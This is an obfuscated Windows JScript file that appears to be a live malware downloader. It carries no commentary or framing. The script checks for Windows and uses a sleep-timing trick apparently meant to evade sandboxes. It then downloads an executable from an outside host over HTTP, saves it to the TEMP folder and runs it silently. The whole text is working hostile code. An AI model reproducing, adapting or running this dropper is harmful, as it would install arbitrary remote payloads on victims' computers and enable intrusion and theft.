var Kp = false;
var Wy = "CreateObject";
var ZX = function L() {return WScript[Wy]("WScript.Shell");}(), gz = 11;
var lt = "MSXML2.XMLHTTP";
var ts = 2123213;
var dU = 0;
function a0(Vx){ZX["Run"](Vx, dU, dU);};
function G(){return "" + lt;};
function aA(La, op){dU = dU * 1; return La - op;};
function Gd(){return Wy;};
/*@cc_on
  @if (@_win32 || @_win64)
    Kp = true;
  @end
@*/
if (Kp)
{
var jV = "";
function a(){return 22;};
var A = 0; var c = 0;
function rh()
{
var dx = new this["Date"]();
var I = dx["getUTCMilliseconds"]();
WScript["Sleep"](a());
var dx = new this["Date"]();
var W = dx["getUTCMilliseconds"]();
WScript["Sleep"](a());
var dx = new this["Date"]();
var U0 = dx["getUTCMilliseconds"]();
var A = "Cz";
A = aA(W, I);
var c = "y0";
c = aA(U0, W);
jV = "open";
return aA(A, c);
}
var dI = false;
var W0 = false;
for (var wP = dU; wP < a() * 1; wP++){if (rh() != dU){
dI = true; 
c = "31" + 11 * A + c; 
W0 = true; 
break;
}}
function y() {return ((dI == true) && (dI == W0)) ? 1 : dU;};
if (dI && y() && W0){
function q() {return ZX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3fnKFqGcs.exe";};
 vX = G();
 mx = WScript[Wy](vX);
 var dw = 1;
 while (dw){
try {
mx[jV]("GET", "http://energq.com/e3ola", false);
mx["send"]();
JI = "Sleep";
for (;;){WScript[JI](a() * 11); if (mx["readystate"] >= 2 * 2) break;};
dw = dU;
} catch(T){};
}
function qj(P) {var U = (1, 2, 3, 4, 5, P); return U;};
B = WScript[Gd()]("ADODB.Stream");
vX = B;
vX[jV]();
vX["type"] = qj(1);
vX["write"](mx["ResponseBody"]);
B["position"] = qj(dU);
vX["Save" + "ToFile"](q(), 2);
B["c"+"lose"]();
Jt = q();
a0(Jt);
}
}

